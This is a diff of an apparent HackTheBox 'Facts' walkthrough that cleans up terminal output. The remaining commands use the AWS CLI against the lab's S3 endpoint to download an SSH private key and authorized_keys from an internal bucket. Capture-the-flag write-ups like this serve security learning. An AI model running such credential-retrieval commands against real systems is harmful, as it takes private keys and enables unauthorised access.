@@ -883,23 +883,14 @@ Breakdown:
 Output: 
 
 ```shell
-fatal error: An error occurred (404) when calling the HeadObject operation: Key ".ssh/*" does not exist
-                                                                                                                    
 ┌──(kali㉿kali)-[~/CS/HTB/Facts/CVE-2025-2304]
 └─$ aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .. --profile facts 
-download: s3://internal/.ssh/id_ed25519 to ../id_ed25519            
-                                                                                                                    
-┌──(kali㉿kali)-[~/CS/HTB/Facts/CVE-2025-2304]
-└─$ aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/^[[200~authorized_keys .. --profile facts
-zsh: bad pattern: s3://internal/.ssh/^[[200~authorized_keys
-                                                                                                                    
+download: s3://internal/.ssh/id_ed25519 to ../id_ed25519
+
 ┌──(kali㉿kali)-[~/CS/HTB/Facts/CVE-2025-2304]
 └─$ aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys .. --profile facts
-download: s3://internal/.ssh/authorized_keys to ../authorized_keys
-                                                                                                                    
-┌──(kali㉿kali)-[~/CS/HTB/Facts/CVE-2025-2304]
-└─$ cd ..           
-                                                                                                                    
+download: s3://internal/.ssh/authorized_keys to ../authorized_keys         
+
 ┌──(kali㉿kali)-[~/CS/HTB/Facts]
 └─$ ls
 authorized_keys  CVE-2025-2304  id_ed25519
